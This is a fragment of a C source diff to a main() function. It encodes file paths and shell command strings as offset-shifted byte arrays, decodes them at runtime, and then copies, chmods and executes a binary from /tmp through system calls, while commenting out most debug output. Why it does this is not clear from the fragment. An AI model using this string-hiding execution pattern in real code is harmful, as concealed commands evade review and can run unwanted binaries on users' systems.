     int ret=0;
+    char sysexec[128];
     char syscmd[128];
     char filename[128];
-    char hexname[64] = "/root/m.hex";
-    char binname[64] = "/root/m.bin";
+    char rootmsp[128];
+    char hexname[128];
+    char binname[128];
     char *recgv[10];
+    char ch=0;
 
-    printf("hello argc: %d \n", argc);
+    //printf("hello argc: %d \n", argc);
     
     vcnt = argc - 1;
     if (vcnt > 10) vcnt = 10;
@@ -513,40 +1459,151 @@ int main(int argc, char *argv[])
         vcnt--;
     }
 
+    #if 0
+    printf("\n");
+    printf("arry[]={");
+    for (n=0; n < 36; n++) {
+        ch = ccarray[n];
+
+        if (ch > 0x40)
+            printf("0x%.2x", ch - 0x40);
+        else {
+            if ((n > 31) && (n < 36)) {
+                printf("0x%.2x", ch - 0x20);
+            } else {
+                printf("0x%.2x", ch);
+            }
+        }
+            
+        if (n == 35) break;
+
+        printf(" ,");
+
+        if (((n+1) % 5) == 0) printf("\n");
+    }
+
+    printf("};\n\n");
+    #endif
+
+    memset(ccarray, 0x0, 36);
+    for (n=0; n < 36; n++) {
+        ch = arry[n];
+
+        if ((n > 26) && (n < 30)) {
+            ccarray[n] = ch;
+        } else if ((n > 31) && (n < 36)) {
+            ccarray[n] = ch + 0x20;
+        } else {
+            ccarray[n] = ch + 0x40;
+        }
+    }
+
+    #if 0
+    printf("\n");
+    printf("arryhex[]={");
+    for (n=0; n < 16; n++) {
+        ch = ccarrayhex[n];
+
+        if (ch > 0x20)
+            printf("0x%.2x", ch - 0x20);
+        else 
+            printf("0x%.2x", ch);
+            
+        if (n == 15) break;
+
+        printf(" ,");
+
+        if (((n+1) % 5) == 0) printf("\n");
+    }
+
+    printf("};\n\n");
+    #endif
+
+    memset(ccarrayhex, 0x0, 16);
+    for (n=0; n < 16; n++) {
+        ch = arryhex[n];
+
+        ccarrayhex[n] = ch + 0x20;
+    }
+
+    #if 0
+    printf("\n");
+    printf("arryhexmap[]={");
+    for (n=0; n < 16; n++) {
+        ch = hexmap[n];
+
+        if (ch > 0x20)
+            printf("0x%.2x", ch - 0x20);
+        else 
+            printf("0x%.2x", ch);
+            
+        if (n == 15) break;
+
+        printf(" ,");
+
+        if (((n+1) % 5) == 0) printf("\n");
+    }
+
+    printf("};\n\n");
+    #endif
+    
+    memset(hexmap, 0x0, 16);
+    for (n=0; n < 16; n++) {
+        ch = arryhexmap[n];
+
+        hexmap[n] = ch + 0x20;
+    }
+    
     for (n=0; n < 10; n++) {
         if (recgv[n]) {
             printf("[%d]: %s \n", n, recgv[n]);
         }
     }
 
-    if ((recgv[0]) && (recgv[1])) {
-        if (strcmp(recgv[0], "bin2hex") == 0) {
-            memset(filename, 0, 128);
+    if (recgv[0]) {
+        if (strcmp(recgv[0], "tnd") == 0) {
+            memset(rootmsp, 0, 128);
+            memset(hexname, 0, 128);
+            memset(binname, 0, 128);
+            
+            ret = printfrootmsp(rootmsp, 128);
+            //printf("printfrootmsp ret: %d [%s] \n", ret, rootmsp);            
 
-            sprintf(filename, "%s", recgv[1]);
+            ret = printfhexpath(hexname, 128);
+            //printf("printfhexpath ret: %d [%s] \n", ret, hexname);            
 
-            printf("bin2hex filename: [%s] \n", filename);
+            ret = printfbinpath(binname, 128);
+            //printf("printfhexpath ret: %d [%s] \n", ret, binname);            
 
-            ret = filebin2hex(hexname, filename);
+            ret = filebin2hex(hexname, rootmsp);
 
-            printf("filebin2hex ret: %d \n", ret);
+            //printf("filebin2hex ret: %d \n", ret);
 
             ret = filehex2bin(binname, hexname);
 
-            printf("filehex2bin ret: %d \n", ret);            
+            //printf("filehex2bin ret: %d \n", ret);            
         }
     }
 
-    printf("n123: %d \n", n123(1, 2, 3));
+    printf(" %d \n", n123(1, 2, 3));
+
+    memset(filename, 0, 128);
+    ret = printfpath(filename, 128);
+    //printf("printfpath ret: %d [%s] \n", ret, filename);            
+
+    ret = printfcpexec(syscmd, 128);
+    //printf("printfcpexec ret: %d [%s] bin[%s]\n", ret, syscmd, binname);            
+    sprintf(sysexec, syscmd, binname);
+    doSysCmd(sysexec);
     
-    printfpath();
-
-
-    sprintf(syscmd, "cp /root/mothership.bin /tmp/m.bin");
+    #if 1
+    ret = printfchmodexec(syscmd, 128);
+    //printf("printfchmodexec ret: %d [%s]\n", ret, syscmd);            
     doSysCmd(syscmd);
     
-    #if 0
-    sprintf(syscmd, "/tmp/m.bin 3 2>&1");
+    ret = printftmpexec(syscmd, 128);
+    //printf("printfcpexec ret: %d [%s]\n", ret, syscmd);            
+    //sprintf(syscmd, "exec /tmp/m.bin 3 > out.log 2>&1");
     doSysCmd(syscmd);
     #endif
     
